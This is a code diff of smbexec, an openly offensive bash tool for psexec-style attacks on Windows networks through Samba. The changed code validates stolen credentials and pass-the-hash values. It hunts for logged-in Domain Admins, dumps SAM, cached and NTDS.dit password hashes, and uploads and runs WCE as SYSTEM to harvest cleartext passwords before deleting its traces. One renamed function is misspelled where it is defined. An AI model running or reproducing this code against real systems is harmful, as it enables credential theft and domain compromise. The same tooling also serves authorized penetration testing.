@@ -7,6 +7,7 @@
 # Script super-dopified by @al14s - Thanks for taking it to the next level!!
 #
 #Rapid psexec style attack using linux samba tools
+#
 #Copyright (C) 2013 Eric Milam (Brav0Hax) & Martin Bos (Purehate)
 #
 #This program is free software: you can redistribute it and/or modify
@@ -24,7 +25,7 @@
 #
 #############################################################################################
 
-version="1.2.5"
+version="1.2.6"
 codename="Mommy's Little Monster"
 
 # Check to see if X is running
@@ -50,11 +51,6 @@ if [ ! -e $smbexecpath/smbexeclient ] || [ ! -e $smbexecpath/smbwinexe ]; then
 	exit 1
 fi
 
-# Check if its Fedora or Red Hat, because they feel the need to be "special"
-if [ -e /etc/redhat-release ]; then
-	isrhfedora=1
-fi
-
 logfldr=$PWD/$(date +%F-%H%M)-smbexec
 mkdir $logfldr
 
@@ -70,7 +66,7 @@ if [ ! -e /usr/local/samba/lib/smb.conf ]; then
 fi
 
 # See if wce exists in the progs folder
-if [ -e $smbexecpath/wce.exe ]; then wce=1; fi
+if [ -e $smbexecpath/wce-32.exe ] && [ -e $smbexecpath/wce-64.exe ]; then wce=1; fi
 
 f_ragequit(){ 
 echo -e "\n\n\e[1;31m[-] Rage-quitting....\e[0m"
@@ -364,7 +360,7 @@ password_hash=
 	# Check to see if login is valid
 		for j in $(cat /tmp/smbexec/credentials.lst); do
 			unset SMBHASH
-			password_hash=$(echo $j|cut -d "%" -f2)
+			password_hash=$(echo $j|cut -d "%" -f2-)
 			if [ "$(echo $password_hash| wc -m)" -ge "65" ]; then
 				export SMBHASH=$password_hash # This is required when using a hash value
 			fi
@@ -383,8 +379,9 @@ password_hash=
 }
 
 f_successful_login(){
-username=$(echo $j|cut -d "%" -f1)
-password=$(echo $j|cut -d "%" -f2)
+
+username=$(echo $j|cut -d "%" -f1|tr '[:upper:]' '[:lower:]')
+password=$(echo $j|cut -d "%" -f2-)
 successful_login=$(cat /tmp/smbexec/credential.chk|grep "//$i")
 
 if [ -z "$successful_login" ]; then
@@ -403,30 +400,46 @@ fi
 f_get_domain_admin_users(){
 if [ ! -e /tmp/smbexec/admins.tmp ]; then
 	$smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C net group \"Domain Admins\" /domain && net group \"Enterprise Admins\" /domain" &> /tmp/smbexec/admins.tmp
-	cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|sort -u> /tmp/smbexec/admins.lst
+	cat /tmp/smbexec/admins.tmp |egrep -v '(Group name|Comment|Members|-----|successfully|HASH PASS|ERRDOS)'|sed -e 's/\s\+/\n/g'|sed '/^$/d'|tr '[:upper:]' '[:lower:]'|sort -u> /tmp/smbexec/admins.lst
 fi
 }
 
 f_get_logged_in_users(){
 $smbexecpath/smbwinexe -U $SMBDomain/$j //$i "CMD /C tasklist /V /FO CSV" &> /tmp/smbexec/tasklist.tmp
-cat /tmp/smbexec/tasklist.tmp |cut -d '"' -f14|egrep -v '(NT AUTHORITY|User Name|HASH PASS|ERRDOS)'|cut -d "\\" -f2|sort -u > /tmp/smbexec/tasklist.sorted
 
-$smbexecpath/smbwinexe --uninstall -U $SMBDomain/$j //$i "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
-cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|cut -d "," -f3|egrep -v '(USERNAME|65536|HASH PASS|ERRDOS)' > /tmp/smbexec/qwinsta.sorted
-sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
+#win2k doesn't have tasklist - this will hopefully prevent error spewing
+f_tasklist_check
+
+if [ -z "$tasklist_check" ]; then
+	cat /tmp/smbexec/tasklist.tmp |cut -d '"' -f14|egrep -v '(NT AUTHORITY|User Name|HASH PASS|ERRDOS)'|cut -d "\\" -f2|tr '[:upper:]' '[:lower:]'|sort -u > /tmp/smbexec/tasklist.sorted
+
+	$smbexecpath/smbwinexe --uninstall -U $SMBDomain/$j //$i "CMD /C qwinsta" &> /tmp/smbexec/qwinsta.tmp
+	cat /tmp/smbexec/qwinsta.tmp|sed -e 's/\s\+/,/g'|sed -e 's/>/,/g'|cut -d "," -f3|egrep -v '(USERNAME|65536|HASH PASS|ERRDOS)'|tr '[:upper:]' '[:lower:]' > /tmp/smbexec/qwinsta.sorted
+	sort -u /tmp/smbexec/tasklist.sorted /tmp/smbexec/qwinsta.sorted > /tmp/smbexec/loggedin.users
+else
+	echo -e "\e[1;31m[-] Looks like tasklist isn't available for the system, it may be Win2K.\e[0m"
+fi
+}
+
+f_tasklisk_check(){
+tasklist_check=$(cat /tmp/smbexec/tasklist.tmp|grep -o tasklist)
 }
 
 f_compare_accounts(){
-admins=
-users=
+unset admins
+unset users
 
-for admins in $(cat /tmp/smbexec/admins.lst); do
-        for users in $(cat /tmp/smbexec/loggedin.users|grep -i $admins);do
-                if [ ! -z "$users" ]; then 
-                        echo -e "\t\e[1;32m[+] DA account $users is logged in or running a process on $i \e[0m"|tee -a /tmp/smbexec/da-systems.lst
-                fi
-        done
-done
+if [ -z "$tasklist_check" ]; then
+	for admins in $(cat /tmp/smbexec/admins.lst); do
+        	for users in $(cat /tmp/smbexec/loggedin.users|grep "$admins");do
+        	        if [ ! -z "$users" ]; then 
+        	                echo -e "\t\e[1;32m[+] DA account $users is logged in or running a process on $i \e[0m"|tee -a /tmp/smbexec/da-systems.lst
+        	        fi
+        	done
+	done
+else
+	echo -e "\t\e[1;33m[!] Couldn't get logged in users to check for DA/EA.\e[0m"
+fi
 
 }
 
@@ -586,7 +599,9 @@ for i in $(cat $RHOSTS); do
 		if [ -e $logfldr/hashes/$i/sam ] && [ -e $logfldr/hashes/$i/sys ]; then
 			$creddumpath/pwdump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sam > $logfldr/hashes/$i/localhashes.lst
 			if [ -e $logfldr/hashes/$i/sec ]; then
-				$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > $logfldr/hashes/$i/dcchashes.lst
+				$creddumpath/cachedump.py $logfldr/hashes/$i/sys $logfldr/hashes/$i/sec > /tmp/smbexec/dcchashes.tmp
+				cat /tmp/smbexec/dcchashes.tmp |grep -v "ERR:" > /tmp/smbexec/dcchashes.lst
+				if [ -s $logfldr/hashes/$i/dcchashes.lst ];then mv /tmp/smbexec/dcchashes.lst $logfldr/hashes/$i/dcchashes.lst;fi
 			fi
 			echo -en "\t\e[1;32m[+] Hashes from $i have been dumped...\e[0m\n"
 			sleep 2
@@ -597,10 +612,19 @@ for i in $(cat $RHOSTS); do
 		
 		#Get the clear text passwords with protected wce
 		if [ "$wce" == 1 ]; then
-			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "put $smbexecpath/wce.exe %TEMP%\\wce.exe" &> /dev/null
+			$smbexecpath/smbwinexe -A /tmp/smbexec/smbexec.auth //$i "CMD /C echo %PROCESSOR_ARCHITECTURE%" &> /tmp/smbexec/sys_arch.txt
+			sys_arch=$(cat /tmp/smbexec/sys_arch.txt|grep x86)
+			if [ -z $sys_arch ]; then
+				wce_exe=wce-64.exe
+			else
+				wce_exe=wce-32.exe
+			fi
+			$smbexecpath/smbexeclient -A /tmp/smbexec/smbexec.auth //$i/$temp_drive$ -c "put $smbexecpath/$wce_exe $temp_dir\\wce.exe" &> /dev/null
 			$smbexecpath/smbwinexe --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C %TEMP%\wce.exe -w" &> /tmp/smbexec/wce.tmp
 			#Put the passwords in a text file in the logfolder
-			cat /tmp/smbexec/wce.tmp|grep ":" > $logfldr/hashes/$i/cleartext.pwds
+			cat /tmp/smbexec/wce.tmp|grep :|egrep -v '(non-printable|ERROR|HASH)' > /tmp/smbexec/cleartext.pwds
+			#Move cleartext file if it's not empty
+			if [ -s /tmp/smbexec/cleartext.pwds ];then mv /tmp/smbexec/cleartext.pwds $logfldr/hashes/$i/cleartext.pwds;fi
 			#cleanup the host including wce.exe
 			$smbexecpath/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //$i "CMD /C DEL %TEMP%\sam && DEL %TEMP%\sec && DEL %TEMP%\sys && DEL %TEMP%\wce.exe" &> /dev/null
 		else
@@ -806,12 +830,12 @@ echo -e "\n\e[1;33m[*]Extracting hashes, please standby...\e[0m"
 sleep 2
 dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
 python $dsuserspath/dsusers.py /tmp/smbexec/ntds.dit.export/$datatable /tmp/smbexec/ntds.dit.export/$linktable --passwordhashes $logfldr/hashes/DController/sys --passwordhistory $logfldr/hashes/DC/sys > $logfldr/hashes/DC/ntds.output
-$smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/dc-hashes.lst
+$smbexecpath/ntdspwdump.py $logfldr/hashes/DC/ntds.output > $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst
 
 set -f              # turn off globbing
 IFS='
 '	# split at newlines only
-for i in $(cat $logfldr/hashes/DC/dc-hashes.lst); do
+for i in $(cat $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst); do
 	dc_username=$(echo "$i" |cut -d ":" -f1)
 	dc_hashvalue=$(echo "$i" |cut -d ":" -f3-4)
 	echo -e $dc_username'\t'$dc_hashvalue >> /tmp/smbexec/hash_pass_lst.tmp
@@ -819,9 +843,10 @@ done
 unset IFS
 set +f	# turn off globbing
 
+#Remove accounts with empty passwords
 cat /tmp/smbexec/hash_pass_lst.tmp |grep -v "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" > $logfldr/hashes/DC/cred.lst
 
-if [ -s $logfldr/hashes/DC/dc-hashes.lst ]; then
+if [ -s $logfldr/hashes/DC/$SMBDomain-dc-hashes.lst ]; then
 	echo -e "\n\e[1;32m[+] Success, looks like we got what we came for...\e[0m"
 	sleep 5
 else
@@ -973,7 +998,7 @@ f_smbauthinfo(){
 	cat /tmp/smbexec/connects.tmp | grep "//$i" > /tmp/smbexec/success.chk
 	logonfail=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_LOGON_FAILURE")
 	connrefused=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_CONNECTION_REFUSED")
-	badshare=$(cat /tmp/smbexec/connects.tmp | egrep 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
+	badshare=$(cat /tmp/smbexec/connects.tmp | grep -E 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
 	unreachable=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_HOST_UNREACHABLE")
 	accessdenied=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_ACCESS_DENIED")
 }
